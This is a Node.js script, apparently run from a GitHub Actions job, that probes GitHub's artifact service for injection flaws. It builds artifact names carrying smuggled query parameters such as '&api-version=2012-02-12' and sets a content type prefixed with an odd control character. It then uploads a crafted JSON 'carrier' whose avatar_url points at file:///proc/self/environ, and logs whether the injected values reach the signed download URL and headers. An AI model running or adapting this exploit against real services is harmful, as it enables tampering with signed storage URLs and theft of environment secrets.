import {createHash} from 'node:crypto';
import http from 'node:http';
import https from 'node:https';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids=getBackendIdsFromToken();
const client=internalArtifactTwirpClient({maxAttempts:1});
const repo=process.env.GITHUB_REPOSITORY;
const runId=process.env.GITHUB_RUN_ID;
const token=process.env.GITHUB_TOKEN;
const odd='\u0085application/json';
const sha=b=>createHash('sha256').update(b).digest('hex');

function req(url,method='GET',body=null,headers={}){
  return new Promise((resolve,reject)=>{
    const target=new URL(url);const mod=target.protocol==='https:'?https:http;
    const r=mod.request(target,{method,headers,timeout:20000},res=>{
      const chunks=[];res.on('data',c=>chunks.push(c));
      res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,rawHeaders:res.rawHeaders,body:Buffer.concat(chunks)}));
    });
    r.on('error',reject);r.on('timeout',()=>r.destroy(new Error('timeout')));
    if(body)r.write(body);r.end();
  });
}
async function upload(url,bytes){const b=new BlobClient(url).getBlockBlobClient();await b.uploadData(bytes,{blobHTTPHeaders:{blobContentType:odd}});}

const cases=[
  ['plain-amp', `v6amp-${runId}-A&api-version=2012-02-12`],
  ['amp-end', `v6amp-${runId}-B&api-version=2012-02-12&`],
  ['enc-amp', `v6amp-${runId}-C%26api-version%3D2012-02-12`],
  ['semi', `v6amp-${runId}-D;api-version=2012-02-12`],
  ['nbsp-amp', `v6amp-${runId}-E&api-version=2012-02-12&x=`],
  ['amp-2019', `v6amp-${runId}-F&api-version=2019-02-02`],
  ['amp-2013', `v6amp-${runId}-G&api-version=2013-08-15`],
  ['amp-sv', `v6amp-${runId}-H&sv=2012-02-12`],
];

for(const [label,name] of cases){
  const rec={label,nameHex:Buffer.from(name).toString('hex')};
  try{
    const created=await client.CreateArtifact({...ids,name,version:6,mimeType:StringValue.create({value:odd})});
    rec.createOk=!!created.ok;rec.uploadUrl=created.signedUploadUrl?new URL(created.signedUploadUrl).pathname:null;
    if(!created.ok){console.log('V6AMP',JSON.stringify(rec));continue;}
    const placeholder=Buffer.from('{}');
    await upload(created.signedUploadUrl,placeholder);
    const fin=await client.FinalizeArtifact({...ids,name,size:String(placeholder.length),hash:StringValue.create({value:`sha256:${sha(placeholder)}`})});
    rec.finalOk=!!fin.ok;rec.id=String(fin.artifactId||'');
    if(!fin.ok){console.log('V6AMP',JSON.stringify(rec));continue;}
    const carrier=Buffer.from(JSON.stringify({full_name:`${repo}/actions/artifacts/${rec.id}/zip`,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:label,stargazers_count:0}));
    await upload(created.signedUploadUrl,carrier);
    rec.carrierSha=sha(carrier);
    const api=await req(`https://api.github.com/repos/${repo}/actions/artifacts/${rec.id}/zip`,'GET',null,{Authorization:`Bearer ${token}`,Accept:'application/vnd.github.v3+json','User-Agent':'repo-cassette-v6amp'});
    rec.restStatus=api.status;rec.location=api.headers.location||null;
    if(api.headers.location){
      const u=new URL(api.headers.location);
      rec.rsct=u.searchParams.get('rsct');rec.apiVersion=u.searchParams.get('api-version');rec.query=u.search;
      const f=await req(api.headers.location);
      const cts=[];for(let i=0;i<f.rawHeaders.length;i+=2)if(f.rawHeaders[i].toLowerCase()==='content-type')cts.push(Buffer.from(f.rawHeaders[i+1],'latin1').toString('hex'));
      rec.finalStatus=f.status;rec.finalCts=cts;rec.bodyMatch=f.body.equals(carrier);
    }
  }catch(e){rec.error=String(e.message||e).slice(0,200);}
  console.log('V6AMP',JSON.stringify(rec));
}
